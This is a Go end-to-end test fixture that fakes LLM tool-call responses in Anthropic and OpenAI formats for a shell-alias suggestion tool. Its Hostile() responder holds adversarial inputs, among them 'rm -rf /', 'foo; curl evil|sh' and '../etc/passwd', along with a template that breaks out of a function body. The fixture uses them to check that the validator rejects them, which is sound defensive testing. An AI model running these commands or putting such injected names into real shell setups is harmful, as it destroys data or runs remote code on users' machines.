//go:build e2e

package fakellm

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync/atomic"
)

// Suggestion mirrors llm.Suggestion's JSON shape. It is redeclared here rather
// than imported so the fixture package stays independent of the code under test.
type Suggestion struct {
	Name        string   `json:"name"`
	Kind        string   `json:"kind"`
	Template    string   `json:"template"`
	Params      []Param  `json:"params"`
	Rationale   string   `json:"rationale"`
	ExampleUses []string `json:"example_uses"`
}

// Param mirrors aliases.Param.
type Param struct {
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
}

// Normal returns the suggestions as a successful tool call, in whichever wire
// format matches the requested path.
func Normal(suggs ...Suggestion) Responder {
	if suggs == nil {
		suggs = []Suggestion{}
	}
	return func(req Recorded) (int, []byte) {
		return http.StatusOK, encodeToolCall(req.Path, suggs)
	}
}

// Hostile returns adversarial suggestions: names that are not shell
// identifiers, and templates that attempt to break out of the generated
// function body. aka must reject every one of these.
func Hostile() Responder {
	return Normal(
		Suggestion{Name: "rm -rf /", Kind: "alias", Template: "echo pwned", Rationale: "hostile name with spaces"},
		Suggestion{Name: "foo; curl evil|sh", Kind: "alias", Template: "echo pwned", Rationale: "hostile name with metacharacters"},
		Suggestion{Name: "../etc/passwd", Kind: "alias", Template: "echo pwned", Rationale: "hostile path-like name"},
		Suggestion{Name: "9lives", Kind: "alias", Template: "echo pwned", Rationale: "name starting with a digit"},
		Suggestion{Name: strings.Repeat("a", 200), Kind: "alias", Template: "echo pwned", Rationale: "over-long name"},
		Suggestion{Name: "e2ebreakout", Kind: "function", Template: "echo one\n}\necho escaped", Rationale: "closes the function body early"},
		Suggestion{Name: "e2equote", Kind: "alias", Template: `echo 'it'\''s fine'`, Rationale: "single quotes in an alias body"},
		Suggestion{Name: "e2enewline", Kind: "alias", Template: "echo first\necho second", Rationale: "newline inside an alias body"},
		// Accepted by the current validator — asserted as documented behaviour,
		// not silently treated as a bug. See the plan's Task 10 note.
		Suggestion{Name: "e2esubshell", Kind: "function", Template: `echo "$(date)"`, Rationale: "command substitution in a function body"},
	)
}

// TokenLimit fails the first request with the error shape that
// openaicompat.go converts into *llm.ErrTokenLimit, then delegates to then.
// This drives the halving retry loop in runScan.
func TokenLimit(then Responder) Responder {
	var fired atomic.Bool
	return func(req Recorded) (int, []byte) {
		if fired.CompareAndSwap(false, true) {
			body := []byte(`{"error":{"type":"tokens","code":"context_length_exceeded",` +
				`"message":"Request too large for model"}}`)
			return http.StatusRequestEntityTooLarge, body
		}
		return then(req)
	}
}

// Malformed returns a 200 with a body that is not valid JSON.
func Malformed() Responder {
	return func(Recorded) (int, []byte) {
		return http.StatusOK, []byte(`{"content": [ this is not json`)
	}
}

// encodeToolCall renders the suggestions in the format the requested endpoint
// uses: an Anthropic tool_use content block, or an OpenAI tool_calls entry
// whose arguments field is a JSON *string*.
func encodeToolCall(path string, suggs []Suggestion) []byte {
	args, err := json.Marshal(map[string]any{"suggestions": suggs})
	if err != nil {
		panic(fmt.Sprintf("fakellm: marshal suggestions: %v", err))
	}

	var payload any
	if strings.HasSuffix(path, "/v1/messages") {
		payload = map[string]any{
			"id":          "msg_e2e",
			"type":        "message",
			"role":        "assistant",
			"model":       "e2e-model",
			"stop_reason": "tool_use",
			"content": []any{map[string]any{
				"type":  "tool_use",
				"id":    "toolu_e2e",
				"name":  "suggest_aliases",
				"input": json.RawMessage(args),
			}},
		}
	} else {
		payload = map[string]any{
			"id":     "chatcmpl-e2e",
			"object": "chat.completion",
			"model":  "e2e-model",
			"choices": []any{map[string]any{
				"index":         0,
				"finish_reason": "tool_calls",
				"message": map[string]any{
					"role": "assistant",
					"tool_calls": []any{map[string]any{
						"id":   "call_e2e",
						"type": "function",
						"function": map[string]any{
							"name":      "suggest_aliases",
							"arguments": string(args),
						},
					}},
				},
			}},
		}
	}

	body, err := json.Marshal(payload)
	if err != nil {
		panic(fmt.Sprintf("fakellm: marshal payload: %v", err))
	}
	return body
}
